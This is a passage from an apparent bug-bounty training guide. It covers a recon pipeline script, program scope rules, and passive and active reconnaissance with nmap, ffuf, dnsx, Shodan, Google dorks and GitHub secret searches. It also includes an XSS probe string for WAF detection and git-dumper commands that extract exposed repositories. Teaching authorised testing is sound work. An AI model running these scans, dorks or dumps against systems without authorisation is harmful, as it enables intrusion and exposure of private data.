cat $DIR/live_hosts.txt | awk '{print $1}' | while read host; do
  ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
       -u "$host/FUZZ" -mc 200,301,302,403 \
       -o "$DIR/ffuf_$(echo $host | md5sum | cut -d' ' -f1).json" \
       -of json -silent -rate 50
done

# 7. Nuclei scan
echo "[*] Running nuclei..."
nuclei -l $DIR/live_hosts.txt \
       -severity critical,high \
       -rate-limit 30 \
       -o $DIR/nuclei_findings.txt \
       -silent

echo ""
echo "[*] === COMPLETE ==="
echo "Subdomains:  $(wc -l < $DIR/all_subdomains.txt)"
echo "Live hosts:  $(wc -l < $DIR/live_hosts.txt)"
echo "URLs:        $(wc -l < $DIR/all_urls.txt)"
echo "Nuclei hits: $(wc -l < $DIR/nuclei_findings.txt)"
```

---

## Tool Quick Reference

|Tool|Category|Install|Primary Use|
|---|---|---|---|
|`subfinder`|Subdomain|`go install`|Fast passive subdomain enum|
|`amass`|Subdomain|`go install`|Comprehensive subdomain enum|
|`assetfinder`|Subdomain|`go install`|Quick passive subdomain check|
|`httpx`|Probing|`go install`|Check which hosts are alive|
|`gowitness`|Probing|`go install`|Screenshot live hosts|
|`ffuf`|Discovery|`go install`|Directory/file/param fuzzing|
|`katana`|Crawling|`go install`|Modern web crawler|
|`waybackurls`|URLs|`go install`|Historical URL collection|
|`gau`|URLs|`go install`|Multi-source URL collection|
|`nuclei`|Scanning|`go install`|Template-based vuln scanning|
|`dnsx`|DNS|`go install`|DNS resolution at scale|
|`anew`|Utility|`go install`|Change detection|
|`gf`|Utility|`go install`|Grep pattern matching on URLs|
|`arjun`|Discovery|`pip install`|Hidden parameter discovery|

---

## Summary

The reconnaissance tool ecosystem divides into four areas: subdomain discovery (subfinder, amass, assetfinder), HTTP probing (httpx, gowitness), URL and content discovery (ffuf, katana, waybackurls, gau), and information extraction (nuclei, gf, arjun). No tool is complete on its own — they are designed to chain together. Subfinder feeds httpx; httpx feeds nuclei and ffuf; gau and waybackurls feed gf and arjun. The complete pipeline runs in under an hour on most targets and produces a structured set of leads for manual testing. All tools should be rate-limited to avoid violating program policies and causing accidental denial of service.

---

## Checklist

- [ ] subfinder installed and configured with at least one API key (GitHub token is free)
- [ ] amass installed
- [ ] assetfinder installed
- [ ] httpx installed and working (`httpx -version`)
- [ ] ffuf installed and working (`ffuf -h`)
- [ ] katana installed
- [ ] waybackurls installed
- [ ] gau installed
- [ ] nuclei installed and templates updated (`nuclei -update-templates`)
- [ ] dnsx installed
- [ ] anew installed
- [ ] gf installed with gf-patterns cloned to `~/.gf`
- [ ] arjun installed
- [ ] gowitness installed
- [ ] SecLists installed (`/usr/share/seclists/` or `~/wordlists/SecLists/`)
- [ ] Ran the full pipeline against a practice target (HackTheBox, TryHackMe, or DVWA)
- [ ] Understand what each tool's output means and how to interpret it
---
# PART THREE: RECONNAISSANCE

---

# Chapter 10: Bug Bounty Programs and Scope

## Objective

Understand how to properly read and interpret bug bounty program policies, define your testing scope, and avoid legal and ethical violations.

## Prerequisites

Chapters 1-9 complete.

## Terminology

|Term|Definition|
|---|---|
|**Program Policy**|The rules of engagement for a bug bounty program|
|**In Scope**|Systems and domains you are permitted to test|
|**Out of Scope**|Systems you must NOT test|
|**VDP**|Vulnerability Disclosure Program — like a bug bounty but without monetary reward|
|**Private Program**|Invite-only bug bounty program|
|**Public Program**|Open to all researchers|
|**Safe Harbor**|Legal protection for researchers who follow the program rules|
|**Coordinated Disclosure**|Working with the company to fix issues before making them public|
|**Response SLA**|Service Level Agreement — how long the company says it will take to respond|

## Theory

### Before You Test Anything: READ THE POLICY

This cannot be overstated. Before you run a single tool against any target, you must read the program policy cover to cover. Testing out-of-scope assets is not just a policy violation — it can be illegal.

A program policy defines:

1. **What you can test** (scope)
2. **What you cannot test** (out of scope)
3. **What actions are prohibited** (no DoS, no social engineering, no physical attacks)
4. **What types of vulnerabilities they care about**
5. **How much they pay** (reward range per severity)
6. **How to report** (which platform, what format)
7. **Disclosure policy** (when/how you can publish findings)

### Understanding Scope Definitions

Scope is almost always defined as a list of domains, subdomains, or ASN (network ranges).

**Example scope:**

```
IN SCOPE:
*.example.com         (all subdomains of example.com)
api.example-corp.io   (specific subdomain)
example.com           (root domain)
Mobile apps (iOS and Android)

OUT OF SCOPE:
payment.example.com   (payment processing — handled by third party)
*.thirdparty.com      (partner sites)
example-staging.com   (staging environment)
Employees and their accounts
Social engineering
Physical security
```

**Interpreting wildcard scope `*.example.com`:**

- This means ALL subdomains are in scope: `app.example.com`, `api.example.com`, `dev.example.com`, etc.
- The root domain `example.com` itself may or may not be in scope — check explicitly
- Sub-subdomains: `internal.api.example.com` — usually in scope, but verify

**Common scope ambiguities:**

- "All assets" — very broad, but usually means domains they own, not third-party services
- IPs vs. domains — if they list `93.184.216.0/24`, you can test those IPs but cannot assume every domain on those IPs is in scope

### What Actions Are Typically Prohibited

Even within scope, these actions are almost always prohibited:

- **Denial of Service (DoS):** Do not crash servers or degrade performance
- **Automated scanners without throttling:** Avoid hammering servers with thousands of requests per second
- **Social engineering:** Do not phish employees or customers
- **Physical attacks:** Do not try to access physical facilities
- **Data exfiltration:** Finding a vulnerability in a database is enough — do not download user data
- **Destruction or modification of data:** Do not alter or delete data
- **Testing from restricted IPs:** Some programs require you to use specific IPs or not use VPNs
- **Testing on accounts you do not own:** Create your own test accounts, do not use real users' accounts

### Common Vulnerability Exclusions

Many programs exclude certain vulnerability classes that they consider low-risk or out of scope:

|Commonly Excluded|Reason|
|---|---|
|Missing security headers (alone)|Low impact without exploitation path|
|Self-XSS|Only affects the attacker|
|Logout CSRF|Low practical impact|
|Open redirects without demonstrated impact|Varies by program|
|Clickjacking without sensitive action|Low impact|
|Rate limiting without impact|Varies|
|Username/email enumeration alone|Debated|
|Software version disclosure|Information only|
|Missing SPF/DMARC|Email security, varies|

**Read what the program explicitly excludes.** Reporting an excluded vulnerability wastes everyone's time.

### Choosing Your First Programs

As a beginner, choose programs with:

1. **Wide scope** — More targets = more attack surface
2. **Good communication reputation** — Check reviews on Disclosure.io or similar sites
3. **Clear policies** — Well-written policies are easier to follow
4. **Responsive teams** — Programs that respond within a few days, not months
5. **Beginner-friendly** — Some programs explicitly welcome new researchers

**Good starting programs (as of this writing — always check current status):**

- HackerOne's Bug Bounty Beginners guide lists recommended programs
- Programs at major tech companies tend to have clear policies
- VDP programs (no bounty) are good for learning without pressure

### Creating Your Testing Account

For most programs:

1. Create a dedicated testing account on the target application
2. Use a clearly labeled test email (e.g., `yourname+bugbounty@gmail.com`)
3. Do NOT use real personal information
4. Do NOT test on other users' accounts

Some programs provide dedicated test accounts or environments. Use them.

## Decision Tree: Is This In Scope?

```
I found a potential vulnerability at [URL]
│
├── Is this domain in the program scope?
│   ├── NO → Do NOT test. Stop.
│   └── YES → Continue
│
├── Is this domain/feature explicitly excluded?
│   ├── YES → Do NOT test. Stop.
│   └── NO → Continue
│
├── Is the vulnerability type excluded by the program?
│   ├── YES → Do NOT report. Move on.
│   └── NO → Continue
│
├── Would exploiting this require prohibited actions?
│   ├── YES → Do NOT proceed. Stop.
│   └── NO → Continue
│
└── Test the vulnerability (minimal impact, use your own test account)
    │
    └── Report the vulnerability
```

## Summary

Reading and understanding bug bounty program policies is a non-negotiable prerequisite to testing. Always confirm that your target domain is in scope, that the vulnerability type is accepted, and that your testing methods comply with the program's rules. Start with programs that have wide scope and clear policies.

## Checklist

- [ ] Always read the full program policy before testing
- [ ] Have identified the in-scope domains/IPs
- [ ] Have noted all explicitly out-of-scope items
- [ ] Have noted prohibited testing actions
- [ ] Have noted excluded vulnerability types
- [ ] Have created a dedicated test account on the target
- [ ] Have set the target scope in Burp Suite

---

# Chapter 11: Passive Reconnaissance

## Objective

Gather maximum information about a target using only publicly available data — without sending a single packet to the target's servers. Passive recon is legal, safe, and often reveals surprisingly sensitive information.

## Prerequisites

Chapter 10 complete.

## Terminology

|Term|Definition|
|---|---|
|**OSINT**|Open Source Intelligence — gathering information from public sources|
|**Passive Recon**|Information gathering that does not interact with the target|
|**Footprinting**|Building a profile of the target's digital infrastructure|
|**ASN**|Autonomous System Number — a block of IP addresses owned by one organization|
|**WHOIS**|A service that provides information about domain registrations|
|**Certificate Transparency**|Public logs of all TLS certificates issued|
|**Google Dork**|A specialized Google search query for finding specific information|
|**Wayback Machine**|Archive of historical web pages|
|**Shodan**|A search engine for internet-connected devices|

## Theory

### Why Passive Recon First?

Passive reconnaissance is risk-free — you are only accessing publicly available information. You are not sending traffic to the target's servers, so you cannot accidentally trigger alarms, crash services, or violate scope.

Moreover, passive recon often reveals more than you expect:

- Forgotten subdomains running old, unpatched software
- Development servers accidentally exposed to the internet
- API keys committed to public GitHub repositories
- Employee names and email patterns (useful for understanding the organization)
- Historical pages revealing deleted content
- Third-party services used by the target

The professional approach: **always exhaust passive recon before active recon.**

### Technique 1: WHOIS Lookup

WHOIS gives you information about domain registration:

- Who registered the domain (often redacted for privacy, but sometimes not)
- When it was registered
- When it expires
- Which registrar was used
- Name servers (DNS)

```bash
# Basic WHOIS
whois example.com

# Important information to note:
# - Registrant org/name (if not privacy-protected)
# - Registrar
# - Name servers (NS records)
# - Creation date (how old is this domain?)
# - Expiration date (is this domain expiring soon? Potential takeover?)
```

**Bug bounty relevance:**

- Name servers reveal DNS hosting provider (important for subdomain enumeration)
- Old domains may have old SSL certificates
- Some programs include entire IP ranges (ASNs) in scope — WHOIS helps identify them

### Technique 2: DNS Records

```bash
# Look up all available DNS records
dig example.com ANY

# A records (IP addresses)
dig example.com A

# Mail servers
dig example.com MX

# Name servers
dig example.com NS

# TXT records (verification, SPF, DMARC)
dig example.com TXT

# Find the IP and look up its owner
dig example.com +short | head -1 | xargs whois
```

**What to look for:**

- **MX records:** Mail servers often run different software and may have vulnerabilities
- **TXT records:** Can reveal third-party services (Google verification, HubSpot, etc.)
- **NS records:** Who manages their DNS? A misconfiguration could allow DNS takeover.
- **SPF/DMARC records:** Absence of these = potential email spoofing vulnerabilities

### Technique 3: Certificate Transparency Logs

Every time an HTTPS certificate is issued, it is logged in public Certificate Transparency (CT) logs. These logs are a goldmine for subdomain discovery.

CT log search engines:

- `crt.sh` — Free, comprehensive
- `censys.io` — Free tier available
- `certspotter.com`

```bash
# Search crt.sh via command line
curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sort -u

# The % is a wildcard — finds all subdomains
# This returns ALL subdomains that ever had a certificate issued

# Clean up the output (remove wildcards, sort, deduplicate)
curl -s "https://crt.sh/?q=%.example.com&output=json" | \
  jq -r '.[].name_value' | \
  sed 's/\*\.//g' | \
  sort -u
```

**Why this is powerful:** Even subdomains that are no longer in active use but had certificates issued will appear. This reveals forgotten infrastructure.

### Technique 4: Search Engine Dorking

Google (and Bing, DuckDuckGo) index enormous amounts of web content. Specialized search operators called "dorks" let you find specific types of content.

**Basic Google search operators:**

|Operator|Meaning|Example|
|---|---|---|
|`site:`|Limit to a domain|`site:example.com`|
|`inurl:`|URL contains this string|`inurl:admin`|
|`intitle:`|Page title contains this|`intitle:"index of"`|
|`filetype:`|Find specific file types|`filetype:pdf`|
|`"search term"`|Exact phrase match|`"password reset"`|
|`-word`|Exclude this word|`site:example.com -www`|
|`cache:`|Google's cached version|`cache:example.com`|

**Useful bug bounty dorks:**

```
# Find subdomains
site:*.example.com

# Find subdomains not including the main site
site:*.example.com -site:www.example.com

# Find exposed admin panels
site:example.com inurl:admin
site:example.com inurl:dashboard
site:example.com inurl:portal

# Find configuration files
site:example.com filetype:env
site:example.com filetype:config
site:example.com filetype:xml inurl:config

# Find error messages (may reveal paths, tech stack)
site:example.com "Warning: mysql_"
site:example.com "Fatal error"

# Find login pages
site:example.com inurl:login
site:example.com inurl:signin

# Find API documentation
site:example.com inurl:api
site:example.com intitle:"API documentation"

# Find backup files
site:example.com filetype:bak
site:example.com filetype:old

# Find publicly exposed documents
site:example.com filetype:pdf "confidential"
site:example.com filetype:xlsx
```

**Important:** Only use dorking to discover targets and understand the attack surface. Do not download sensitive documents — acknowledge the exposure in your report.

### Technique 5: Wayback Machine / Web Archive

The Wayback Machine (web.archive.org) archives snapshots of web pages over time. This reveals:

- Old pages that no longer exist but may still be accessible
- Old JavaScript files with different API endpoints
- Old parameters that were used
- Changes in how the application worked

```bash
# Using waybackurls tool (install in Chapter 6)
echo "example.com" | waybackurls | sort -u > wayback_urls.txt

# Or using gau (get all URLs)
gau example.com | sort -u > gau_urls.txt

# Combine both for maximum coverage
echo "example.com" | waybackurls > temp1.txt
gau example.com > temp2.txt
cat temp1.txt temp2.txt | sort -u > all_historical_urls.txt

# Look for interesting file types
cat all_historical_urls.txt | grep -E "\.(js|json|xml|conf|config|env|bak|old|backup)$"

# Look for parameters
cat all_historical_urls.txt | grep "?" | sort -u
```

**What to look for:**

- Old API endpoints that may have been removed from the UI but still exist server-side
- Old parameter names that developers removed from forms but forgot to remove from backend
- Old admin interfaces
- JavaScript files from years ago that contain different code

### Technique 6: Shodan

Shodan (shodan.io) is a search engine for internet-connected devices. It scans the entire internet and indexes what it finds.

```bash
# Install Shodan CLI
pip3 install shodan
shodan init YOUR_API_KEY  # Free API key at shodan.io

# Search for a domain
shodan search "hostname:example.com"

# Search for an IP
shodan host 93.184.216.34

# Find all web servers for an organization
shodan search "org:'Example Corp'"

# Find exposed Elasticsearch instances
shodan search "product:Elastic port:9200"

# Find exposed MongoDB
shodan search "product:MongoDB port:27017"
```

**What to look for on Shodan:**

- Exposed admin interfaces
- Development servers (port 3000, 8080, 8443)
- Database ports (3306, 5432, 27017)
- Outdated server software versions
- Misconfigured services

### Technique 7: GitHub Reconnaissance

Developers often accidentally commit sensitive information to public GitHub repositories:

- API keys
- Database passwords
- Private certificates
- Internal URLs and endpoints
- AWS credentials

```bash
# Tools for GitHub recon
# Install trufflehog
pip3 install trufflehog

# Scan a repository for secrets
trufflehog github --repo https://github.com/example/repo

# Install gitleaks
# Download from: https://github.com/gitleaks/gitleaks/releases
gitleaks detect --source=. --report-format=json
```

**Manual GitHub search (use the GitHub website):**

In GitHub's search bar:

```
org:examplecompany password
org:examplecompany api_key
org:examplecompany secret
org:examplecompany "example.com" password
examplecompany.com token
"example.com" "BEGIN RSA PRIVATE KEY"
```

**Look for:**

- `*.env` files
- `config.json` or `settings.py` with credentials
- Comments mentioning internal URLs
- Hard-coded API keys

**Important:** Finding credentials in a public repo is a valid bug bounty finding. Report it. Do not use the credentials.

### Technique 8: ASN and IP Range Discovery

ASN (Autonomous System Number) identifies a group of IP addresses owned by one organization. Knowing a company's ASN lets you find all their IP space.

```bash
# Find ASN for an organization
# Method 1: Use whois on a known IP
whois 93.184.216.34 | grep "aut-num\|ASN\|AS Number"

# Method 2: Use bgp.he.net (web)
# Go to bgp.he.net, search for the company name

# Method 3: Use amass
amass intel -org "Example Corp"

# Once you have the ASN, get all IP ranges
whois -h whois.radb.net -- '-i origin AS12345' | grep -Eo "([0-9.]+){4}/[0-9]+"
```

### Technique 9: Technology Fingerprinting (Passive)

Understanding what technology the target uses helps you know which vulnerabilities to look for.

**Passive methods:**

- **Wappalyzer browser extension:** Identifies frameworks, CMS, analytics, etc.
- **BuiltWith (builtwith.com):** Technology profile for any domain
- **Netcraft (netcraft.com):** Server technology history
- **DNS records:** TXT records reveal Google Analytics, HubSpot, etc.

```bash
# whatweb — fingerprint technologies
whatweb example.com

# Check response headers for technology clues
curl -I https://example.com
```

**Technology information reveals vulnerabilities:**

- WordPress → Check for plugin vulnerabilities
- PHP → PHP-specific attack surface
- Spring Boot → Actuator endpoints (`/actuator`, `/actuator/env`)
- Struts → Remote code execution history
- Apache Solr → Known CVEs

### Organizing Passive Recon Results

Create a structured document for each target:

```markdown
# Target: example.com
## Date: 2026-01-15

### WHOIS
- Registrar: GoDaddy
- NS: ns1.exampledns.com, ns2.exampledns.com
- Created: 2010-01-01
- Expires: 2027-01-01

### Technologies
- Web Server: nginx/1.18.0
- Framework: React (frontend), Node.js (backend)
- CDN: Cloudflare
- Analytics: Google Analytics, Mixpanel

### Subdomains Found (CT Logs)
- www.example.com
- api.example.com
- dev.example.com  ← INTERESTING: development server
- admin.example.com ← INTERESTING: admin panel
- mail.example.com

### Historical URLs (Wayback)
- /api/v1/users (old endpoint)
- /admin/dashboard (removed from UI)
- /config.json (was once accessible?)

### GitHub Findings
- Found company GitHub: github.com/examplecompany
- Repository: examplecompany/api — contains .env.example with parameter names

### Shodan Findings
- Port 8080 open: dev.example.com — running Express.js, not behind WAF
- Port 3306 open on 93.184.216.100 — MySQL exposed!

### Interesting Dork Results
- https://dev.example.com — Development server with debug mode
- https://example.com/admin/login — Admin login page
```

## Summary

Passive reconnaissance gathers maximum information without touching the target. Certificate transparency logs, Google dorking, Wayback Machine, Shodan, and GitHub reconnaissance are your primary tools. Organize findings systematically. The quality of your passive recon directly determines the quality of your subsequent active testing.

## Checklist

- [ ] WHOIS lookup complete — noted NS records, organization info
- [ ] DNS records queried — noted A, MX, TXT, NS records
- [ ] CT log search complete — subdomains extracted from crt.sh
- [ ] Google dorking complete — searched for admin panels, config files, error messages
- [ ] Wayback Machine URLs collected and filtered for interesting paths
- [ ] GitHub recon complete — checked for public repositories and secrets
- [ ] Shodan search complete — noted exposed ports and services
- [ ] Technologies identified via Wappalyzer and whatweb
- [ ] All findings organized in a structured document

---

# Chapter 12: Active Reconnaissance

## Objective

Learn how to move from passive intelligence gathering to active reconnaissance — directly interacting with the target's infrastructure to enumerate live services, map attack surface, fingerprint technologies, and discover content that passive methods cannot find. Understand how to do this responsibly within program scope.

## Prerequisites

- Chapter 11: Passive Reconnaissance
- Chapter 9: Reconnaissance Tools
- Chapter 8: curl and the Command Line
- Chapter 10: Bug Bounty Programs and Scope (read scope carefully before active recon)

## Terminology

|Term|Definition|
|---|---|
|**Active Reconnaissance**|Information gathering that involves sending traffic directly to the target|
|**Port Scanning**|Probing a host to discover which TCP/UDP ports are open|
|**Service Fingerprinting**|Identifying the software and version running on an open port|
|**Banner Grabbing**|Reading the initial message a service sends when you connect to it|
|**Technology Stack**|The combination of languages, frameworks, servers, and databases a target uses|
|**Virtual Host**|Multiple websites hosted on a single IP address, differentiated by the Host header|
|**Content Discovery**|Finding web paths and files that exist but are not linked from anywhere|
|**DNS Brute-Force**|Trying a wordlist of subdomain names against DNS to find active records|
|**Web Crawling**|Following links throughout a web application to map its structure|
|**WAF**|Web Application Firewall — a security layer that may block some active recon|
|**nmap**|Network Mapper — the industry standard port scanner|

---

## Theory

### Passive vs Active: The Line

Passive reconnaissance reads public data that already exists. Active reconnaissance generates new traffic that reaches the target's servers and network. This distinction matters because:

1. **Active recon is visible** — the target's logs will record your requests
2. **Active recon can violate program rules** — many programs prohibit automated scanners, DoS-style tools, or testing out-of-scope assets
3. **Active recon can cause unintended impact** — aggressive scanning can slow or crash services

**Before starting any active recon:** Confirm the target is in scope and re-read the program's rules about automated tools. Respect rate limits. Never scan out-of-scope assets.

### The Active Recon Workflow

```
Subdomains (from passive recon)
        ↓
DNS Resolution (which subdomains are alive?)
        ↓
Port Scanning (what services are running?)
        ↓
Service Fingerprinting (what software/version?)
        ↓
HTTP Probing (which hosts serve web content?)
        ↓
Technology Detection (what stack are they running?)
        ↓
Virtual Host Discovery (are there hidden vhosts?)
        ↓
Content Discovery (what paths and files exist?)
        ↓
→ Feed results into vulnerability testing
```

---

## Step 1: DNS Resolution at Scale

Before port scanning or HTTP probing, resolve all subdomains to confirm which ones actually exist and what IPs they use.

### Using dnsx

```bash
# Resolve all subdomains from passive recon
cat all_subdomains.txt | dnsx -silent -a -resp

# Output format: subdomain.example.com [IP_ADDRESS]
# Only lines with IPs resolved successfully

# Get CNAME records (critical for takeover detection)
cat all_subdomains.txt | dnsx -silent -cname -resp

# Get all record types at once
cat all_subdomains.txt | dnsx -silent -a -cname -mx -ns -resp -o dns_records.txt

# Extract just the IP addresses
cat all_subdomains.txt | dnsx -silent -a -resp-only > resolved_ips.txt

# Find wildcard DNS (if *.example.com resolves → may inflate subdomain counts)
dnsx -d example.com -wt -silent
```

### Identifying IP Ranges

Group subdomains by IP to understand infrastructure:

```bash
# Sort subdomains by IP to identify shared hosting
cat dns_records.txt | sort -t'[' -k2 | sort -k2

# Extract unique IPs
cat dns_records.txt | grep -oP '\[\K[^\]]+' | sort -u > unique_ips.txt

# WHOIS an IP to identify the hosting provider
whois 93.184.216.34 | grep -i "orgname\|org-name\|netname\|descr"

# Check if IPs are in scope (some programs specify ASN ranges)
cat unique_ips.txt | while read ip; do
  echo "$ip: $(whois $ip | grep -i 'orgname\|netname' | head -1)"
done
```

---

## Step 2: Port Scanning

Port scanning tells you what services are running on each host — not just port 80 and 443. Exposed databases, admin interfaces, and development servers are often on non-standard ports.

### nmap — The Standard

```bash
# Basic scan — top 1000 ports
nmap 93.184.216.34

# Scan common web ports (fast, targeted)
nmap -p 80,443,8080,8443,8888,3000,4000,5000,8000,9000 93.184.216.34

# Scan all 65535 ports (thorough but slow)
nmap -p- 93.184.216.34

# Version detection (identify software and version on each port)
nmap -sV 93.184.216.34

# OS detection + version + scripts
nmap -sV -O 93.184.216.34

# Run default scripts (useful for service enumeration)
nmap -sC 93.184.216.34

# Recommended combined scan
nmap -sV -sC -p 80,443,8080,8443,3000,8000,8888,9000,3306,5432,6379,27017 \
  93.184.216.34

# Scan a list of IPs
nmap -iL unique_ips.txt -p 80,443,8080,8443

# Save output
nmap -sV -oN nmap_output.txt 93.184.216.34
nmap -sV -oX nmap_output.xml 93.184.216.34   # XML format
nmap -sV -oG nmap_output.gnmap 93.184.216.34  # Grepable format

# Faster scan with timing template (T4 = aggressive, T1 = slow/stealthy)
nmap -T4 -p- 93.184.216.34
```

### naabu — Fast Port Scanner (for Lists)

naabu is faster than nmap for scanning many hosts with limited port ranges:

```bash
# Install
go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest

# Scan common ports across all live hosts
cat live_hosts.txt | awk '{print $1}' | naabu -p 80,443,8080,8443,8888,3000,5000,9000

# Save output
naabu -list unique_ips.txt \
      -p 80,443,8080,8443,3000,8000,8888,9000 \
      -o open_ports.txt

# Pipe into httpx for immediate probing
naabu -list unique_ips.txt -p 80,443,8080,8443 | httpx -silent -sc -title
```

### What to Look For in Port Scan Results

|Port|Service|Why It Matters|
|---|---|---|
|21|FTP|Misconfigured FTP may allow anonymous login or path traversal|
|22|SSH|Version fingerprinting; brute-force if weak auth policies|
|25/587|SMTP|Email server — SPF/DMARC bypass possibilities|
|80/443|HTTP/HTTPS|Standard web — always in scope if domain is|
|3000|Node.js/Grafana|Development servers, admin dashboards|
|3306|MySQL|Database exposed to internet — critical finding|
|5432|PostgreSQL|Database exposed to internet — critical finding|
|6379|Redis|Redis without auth — often leads to RCE|
|8080/8443|HTTP-alt|Admin panels, development servers, Jenkins|
|8888|Jupyter/other|Jupyter Notebook without auth = immediate RCE|
|9200|Elasticsearch|Exposed ES is usually unauthenticated — data exposure|
|27017|MongoDB|Exposed MongoDB — often unauthenticated|

**If you find an exposed database port:** Do NOT connect, query, or extract data. Simply document the open port and the service version, confirm it is internet-accessible, and report it as a critical misconfiguration.

---

## Step 3: Service Fingerprinting and Banner Grabbing

Once you know which ports are open, identify what's running on them.

### Using curl for HTTP Banners

```bash
# Check HTTP response headers for technology indicators
curl -sI https://example.com | grep -i "server\|x-powered-by\|x-generator\|via"

# Server: nginx/1.18.0
# X-Powered-By: PHP/7.4.3
# X-Generator: Drupal 9
# Via: cloudflare

# Check all subdomains for technology headers
cat live_hosts.txt | awk '{print $1}' | while read host; do
  echo "=== $host ==="
  curl -sI "$host" | grep -i "server\|x-powered-by\|x-aspnet\|x-generator"
done
```

### Using whatweb

```bash
# Install (usually pre-installed on Kali)
sudo apt install whatweb

# Fingerprint a single target
whatweb https://example.com

# Fingerprint multiple targets
whatweb -i live_hosts.txt

# Aggressive mode (more requests, more info)
whatweb -a 3 https://example.com

# Output in JSON
whatweb https://example.com --log-json=output.json
```

### httpx Technology Detection

```bash
# Detect technologies while probing
cat all_subdomains.txt | httpx -silent -tech-detect -sc -title

# Output example:
# https://blog.example.com [200] [Blog - Example] [WordPress,PHP,MySQL,Apache]
# https://api.example.com [200] [API] [Express,Node.js]
# https://shop.example.com [200] [Store] [Shopify]
```

---

## Step 4: Virtual Host Discovery

A single IP address can serve multiple websites, differentiated only by the `Host` header. Virtual host discovery finds websites not listed in DNS that share an IP with an in-scope target.

```bash
# Using ffuf for vhost discovery
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u https://93.184.216.34 \
     -H "Host: FUZZ.example.com" \
     -mc 200,301,302,403 \
     -fs 1234   # Filter out the default response size (test manually first)

# Using gobuster for vhost discovery
gobuster vhost \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u https://example.com \
  --append-domain

# Check if different Host headers produce different responses
curl -sI https://93.184.216.34 -H "Host: www.example.com" | head -5
curl -sI https://93.184.216.34 -H "Host: admin.example.com" | head -5
curl -sI https://93.184.216.34 -H "Host: internal.example.com" | head -5
```

---

## Step 5: DNS Brute-Force

Even after passive enumeration, active DNS brute-forcing with a good wordlist finds additional subdomains.

```bash
# Generate candidate subdomains and resolve them
# Method 1: dnsx with a wordlist
cat /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt | \
  awk '{print $1".example.com"}' | \
  dnsx -silent -a -resp > brute_results.txt

# Method 2: Combine with massdns for speed
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-20000.txt

massdns -r resolvers.txt \
        -t A \
        -o S \
        -w massdns_output.txt \
        <(cat subdomains-top1million-20000.txt | awk '{print $1".example.com"}')

# Method 3: amass active brute-force
amass enum -brute -d example.com \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -o amass_brute.txt

# Permutation-based subdomain discovery (generate variations of known subdomains)
# If you found "api.example.com", try:
# api-v2.example.com, api-dev.example.com, api-staging.example.com, etc.

# Using gotator for permutations
go install github.com/Josue87/gotator@latest
echo "api" | gotator -sub example.com -depth 1 -silent | dnsx -silent -a -resp
```

---

## Step 6: Web Content Discovery

Find paths, files, and directories that exist on a web server but are not linked from anywhere in the application.

```bash
# Using ffuf — the standard approach
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u https://example.com/FUZZ \
     -mc 200,301,302,403 \
     -t 50

# Important: find your baseline 404 size first
curl -s https://example.com/thispathclearlydoesnotexist12345 | wc -c
# → 1234 bytes

# Then filter it out
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u https://example.com/FUZZ \
     -mc all -fs 1234

# Fuzz for sensitive files specifically
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \
     -u https://example.com/FUZZ \
     -mc 200,301,302,403

# Fuzz with extensions
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u https://example.com/FUZZ \
     -e .php,.bak,.env,.xml,.json,.conf,.yaml,.log \
     -mc 200,301,302,403

# High-priority paths to always check manually
for path in robots.txt sitemap.xml .git/ .env .htaccess server-status phpinfo.php \
            wp-login.php admin/ administrator/ api/docs swagger.json openapi.json \
            console debug actuator actuator/env .DS_Store crossdomain.xml; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://example.com/$path")
  [ "$STATUS" != "404" ] && echo "[$STATUS] /$path"
done
```

---

## Step 7: Technology-Specific Active Checks

Once you know the technology stack, run targeted active checks.

### WordPress

```bash
# Enumerate WordPress users, plugins, and themes
wpscan --url https://example.com --enumerate u,p,t

# Detect vulnerable plugins
wpscan --url https://example.com --enumerate vp --api-token YOUR_TOKEN

# Check common WordPress paths
curl -s https://example.com/wp-login.php | grep -i "wordpress\|wp-login"
curl -s https://example.com/wp-json/wp/v2/users | jq '.[].name'
```

### Spring Boot (Java)

```bash
# Check for exposed Spring Boot Actuator endpoints
for endpoint in actuator actuator/env actuator/health actuator/info \
                actuator/beans actuator/mappings actuator/dump actuator/trace; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://example.com/$endpoint")
  [ "$STATUS" != "404" ] && echo "[$STATUS] /$endpoint"
done

# /actuator/env may expose environment variables including database passwords
# /actuator/mappings reveals all Spring routes (full API map)
```

### GraphQL

```bash
# Find GraphQL endpoints
for path in graphql api/graphql graphiql api/graphiql query api/query; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://example.com/$path")
  [ "$STATUS" != "404" ] && echo "[$STATUS] /$path"
done

# Test if introspection is enabled
curl -s -X POST https://example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}' | jq '.data.__schema.types[0]'
```

### Git Repository Exposure

```bash
# Check for exposed .git directory
curl -s https://example.com/.git/HEAD
# If response is "ref: refs/heads/main" → Git repo is exposed

# Use git-dumper to extract the full repository
pip3 install git-dumper --break-system-packages
git-dumper https://example.com/.git/ output_directory/

# Read the extracted source code
ls -la output_directory/
```

---

## Step 8: WAF Detection

Knowing whether a WAF is present helps you adjust your testing approach.

```bash
# Use wafw00f to detect WAFs
pip3 install wafw00f --break-system-packages
wafw00f https://example.com

# Manual WAF detection — send a basic XSS payload and observe the response
curl -s "https://example.com/search?q=<script>alert(1)</script>" | \
  head -20
# A WAF typically returns a "Request blocked" page or a 403/406

# Check if Cloudflare is present (common indicator)
curl -sI https://example.com | grep -i "cf-ray\|cf-cache\|cloudflare\|server.*cloudflare"

# Check for Akamai
curl -sI https://example.com | grep -i "akamai\|x-check-cacheable\|x-akamai"
```

---

## Organizing Active Recon Results

Create a structured summary after each active recon phase:

```markdown
# Active Recon Results: example.com
## Date: YYYY-MM-DD

## Live Hosts (httpx results)
